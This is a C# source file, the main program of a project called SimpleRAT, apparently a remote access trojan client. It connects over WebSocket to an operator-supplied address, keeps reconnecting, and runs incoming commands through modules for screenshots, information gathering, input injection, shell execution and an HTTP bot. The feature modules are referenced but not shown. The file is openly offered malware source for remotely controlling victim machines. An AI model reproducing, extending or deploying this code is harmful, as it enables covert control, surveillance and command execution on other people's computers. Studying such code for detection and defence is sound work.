using Newtonsoft.Json;
using SimpleRAT.Communication;
using SimpleRAT.Features;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketSharp;
using WebSocketSharp.Server;

namespace SimpleRAT
{
    class Program
    {
        private static WebSocket client;
        private static RequestHandler handler = new RequestHandler(new BaseFeature[]
            {
                Screenshot.Instance,
                InfoGatherer.Instance,
                InputFeature.Instance,
                ShellExec.Instance,
                HttpBot.Instance
            });

        static void Client_OnError(object sender, ErrorEventArgs e)
        {
            Console.WriteLine("Error: {0}", e.Message);
            Reconnect();
        }
        static void Client_OnClose(object sender, CloseEventArgs e)
        {
            Console.WriteLine("Disconnect: {0}", e.Reason);
            Reconnect();
        }
        private static void Reconnect()
        {
            if (client.IsAlive)
            {
                Console.WriteLine("Disconnecting...");
                client.Close();
            }
            Console.WriteLine(" ~~~ Trying to reconnect... ~~~ ");
            client.Connect();
            Console.WriteLine("-> Connected: {0}", client.IsAlive);
            if (!client.IsAlive)
                Reconnect();
        }

        static void Client_OnMessage(object sender, MessageEventArgs e)
        {
            Console.Write($"[{e.RawData.Length}]");
            var request = new Request();
            var response = new Response();
            request = JsonConvert.DeserializeObject<Request>(e.Data);
            Console.Write($" Received {request.Command}-command, processing...");
            response = handler.Handle(request);
            Console.WriteLine("Done.");

            var res = JsonConvert.SerializeObject(response);
            Console.Write($"-> Sending response [{res.Length}]... ");
            ((WebSocket)sender).Send(res);
            Console.WriteLine("Done.");
        }

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("~~~ ERROR ~~~");
                Console.WriteLine("Usage: SimpleRat.exe <ws-address>");
                switch(args.Length)
                {
                    case 0:
                        Console.WriteLine("Nice job supplying nothing, moron.");
                        break;
                    case 2:
                        Console.WriteLine("What am I supposed to do with this stuff?");
                        break;
                    case 42:
                        Console.WriteLine("Get a life.");
                        break;
                    default:
                        Console.WriteLine("I got {0} but a ... ain't one.", args.Length);
                        break;
                }
                Console.ReadKey();
                return;
            }

            var intro = new Intro();
            intro.Play(1);
            Console.WriteLine();
            Console.WriteLine();

            client = new WebSocket(args[0]);
            client.OnMessage += Client_OnMessage;
            client.OnError += Client_OnError;
            client.OnClose += Client_OnClose;
            Console.WriteLine("Connecting to {0}...", client.Url);
            client.Connect();
            Console.WriteLine("###################################");
            Console.WriteLine("# Press ENTER to terminate server #");
            Console.WriteLine("###################################");
            Console.WriteLine();
            Console.ReadLine();
            Console.WriteLine("Closing client...");
            client.Close();
        }
    }
}
